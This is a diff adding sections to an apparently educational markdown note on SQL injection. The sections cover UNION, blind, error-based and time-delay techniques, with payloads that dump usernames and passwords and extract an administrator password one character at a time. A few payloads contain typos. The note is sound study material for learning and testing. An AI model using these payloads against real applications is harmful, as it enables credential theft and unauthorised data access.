@@ -112,3 +112,172 @@ On Oracle, each `SELECT` query must use `FROM`and specify a valid table. In Orac
 `' UNION SELECT NULL FROM DUAL--`
 
 These payloads use `--` to comment out the remainder of the query. In MySQL, the `--` must be followed by a space, alternatively the hash character `#` can be used as a comment.
+
+# Finding Columns with Useful Data Type
+
+Interesting data is typically in string form, meaning that you need to find one or more columns which have the string data type, or are compatible with it.
+
+After the column count is determined, each column can be probed to test for string data using:
+```
+' UNION SELECT 'a',NULL,NULL,NULL--
+' UNION SELECT NULL,'a',NULL,NULL--
+' UNION SELECT NULL,NULL,'a',NULL--
+' UNION SELET NULL,NULL,NULL,'a'--
+```
+
+If a column type receives incompatible string data, it will cause a database error like:
+`Conversion failed when converting the varchar 'a' to data type int`
+
+If this error does not occur, and the response contains additional content including the injected value, then the column is suitable for retrieving string data.
+
+# Using SQLi UNION Attack to Retrieve Interesting Info
+
+Once the column count is determined and a suitable column with the correct data type has been identified, interesting information can be retrieved. Suppose that:
+
+- The original query returns two columns, both can hold string data
+- The injection point is a quoted string within a `WHERE` clause
+- The database contains a table called `users` with the columns `username` and `password`
+
+In this situation, the contents of the `users` table can be retrieved by submitting:
+`UNION SELECT username, password FROM users--`
+
+For this to be possible, you would need to know there is a table called `users` with a column for `username` and `password`.
+
+# Retrieving Multiple Values within a Single Column
+
+Multiple values can be retrieved within a single column by concatenating the values together. On Oracle, the following could be submitted:
+`' UNION SELECT username || '~' || password FROM users--`
+
+The `||` sequence in Oracle is a string concatenation operator. The injected query concatenates `username` and `password`, separated by the `~` character. The results would appear like:
+```
+user1~pass1
+user2~pass2
+user3~pass3
+```
+
+Different databases use different syntax for concatenation.
+
+# Examining the Database in SQLi Attacks
+
+To exploit SQLi, it is necessary to find information about the database like:
+
+- The type and version of the database software
+- The tables and columns the database contains
+
+# Querying Database Type and Version
+
+One way to identify a database version/type is to attempt to inject a provider specific query like one of the below:
+
+| Database Type    | Query                     |
+| ---------------- | ------------------------- |
+| Microsoft, MySQL | `SELECT @@version`        |
+| Oracle           | `SELECT * FROM v$version` |
+| PostgreSQL       | `SELECT version()`        |
+For example, you could try a `UNION` attack like:
+`' UNION SELECT @@version--`
+
+If successful, the output would confirm the database version.
+
+# Listing the Contents of the Database
+
+Most database types (excluding Oracle) have a set of views known as information schema, this provides info about the database. For example, querying `information_schema.tables` will list the tables in the database:
+`SELECT * FROM information_schema.tables`
+
+This will return an output like:
+```
+TABLE_CATALOG    TABLE_SCHEMA    TABLE_NAME    TABLE_TYPE
+=========================================================
+MyDatabase       dbo             Products      BASE TABLE
+MyDatabase       dbo             Users         BASE TABLE
+MyDatabase       dbo             Feedback      BASE TABLE
+```
+
+This indicates 3 tables: `Products`, `Users`, and `Feedback`. This can then be used to query `information_schema.columns` to list the columns in each table:
+`SELECT * FROM information_schema.columns WHERE table_name = 'Users'`
+
+This will return output like:
+```
+TABLE_CATALOG    TABLE_SCHEMA    TABLE_NAME    COLUMN_NAME    DATA_TYPE
+=======================================================================
+MyDatabase       dbo             Users         UserId         int
+MyDatabase       dbo             Users         Username       varchar
+MyDatabase       dbo             Users         Password       varchar
+```
+
+# Blind SQLi
+
+Blind SQL injection is when an application is vulnerable but does not return responses to SQL queries in HTTP. Techniques like the `UNION` attack are not effective against blind SQLi as they rely on being able to see the results of a query.
+
+# Exploiting Blind SQLi by Triggering Conditional Responses
+
+In an app where cookies are used to gather analytics, a request may contain a header like:
+`Cookie: TrackingId=abcdef`
+
+When a request with a `TrackingId` cookie is made, the app uses a SQL query to determine if its from a known user:
+`SELECT TrackingId FROM TrackedUsers WHERE TrackingId='abcdef'`
+
+This query does not return results, but it does behave differently if a recognised `TrackingId` is submitted. A recognised `TrackingId` returns "Welcome back" whilst an unrecognised one does not.
+
+To understand this, consider the following requests containing a `TrackingId`:
+```
+'abcdef' AND '1'='1
+'abcedf' AND '1'='2
+```
+
+The first request will return results, because the injected `AND '1'='1` condition is true, therefore, the "Welcome back" message is displayed. The second value returns no results, because the injected condition is false.
+
+For example, there is a table called `Users` with columns `Username` and `Password`. There is a user called `Administrator`. The password can be determined using a series of inputs, testing one character at a time. Start with the following:
+`'abcdef' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm`
+
+This would return "Welcome back", indicating the injected condition is true, meaning the first character of the password is greater than `m`. This can be continued systematically with `> 't` and so on until the password is determined.
+
+# Error Based SQL Injection
+
+Error based SQL injection is when error messages can be used to extract or infer sensitive information from the database. The possibilities depend on the database configuration & type of errors:
+
+- May be able to induce the application to return a specific error based on result of a boolean expression.
+- May be able to trigger error messages which return data from the query. This turns blind SQLi into visible SQLi.
+
+Some apps carry out SQL queries and their behaviour doesn't change regardless of the query output. It is possible to induce the application to return a different response if an SQL error occurs. Often, an unhandled error thrown by the databases causes a difference in the apps response. 
+
+For example, take two requests containing `TrackingId`:
+```
+xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a
+xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a)
+```
+
+These inputs use `CASE` to test a condition and return a different expression based on whether the expression is true:
+
+- In the first input, `CASE` evaluates to `'a'` which does not cause an error.
+- In the second input, `CASE` evaluates to `1/0` which causes a divide-by-zero error.
+
+If an error is caused, then the same technique as above can be used to determine if the injected condition is true.
+
+# Extracting Sensitive Data via Verbose SQL Errors
+
+Misconfiguration of a database can result in verbose error messages. For example, the following error occurs after injecting a single quote into an `id` parameter:
+`Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = '''. Expected char.`
+
+This shows the full query being used, making it easier to construct a valid query containing a malicious payload. 
+
+Sometimes, an app can be tricked into generating an error message containing some data returned by the query. `CAST` can be used to achieve this. Consider the following query:
+`CAST((SELECT example_col FROM example_table) AS int)`
+
+Attempting to convert a string to an invalid data type like `int` could result in an error like:
+`ERROR: Invalid input syntax for type integer: "ExampleData"`
+
+# Exploiting Blind SQLi Using Time Delays
+
+If an app handles database errors gracefully, there won't be any difference in response. In this situation, it is often possible to exploit blind SQLi by triggering a time delay based on a condition being true or false. Delaying the execution of an SQL query will also delay the HTTP response, allowing you to determine if an injected condition is true.
+
+An example of this on Microsoft SQL server is using the following to test a condition and trigger a delay:
+```
+'; IF (1=2) WAITFOR DELAY '0:0:10'--
+'; IF (1=1) WAITFOR DELAY '0:0:10'--
+```
+
+The first input here will not trigger a delay as the condition is false. The second input will trigger a 10 second delay.
+
+Using this technique, data can be retrieved one character at a time:
+`'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1 > 'm') = 1 WAITFOR DELAY '0:0:02'--`
+
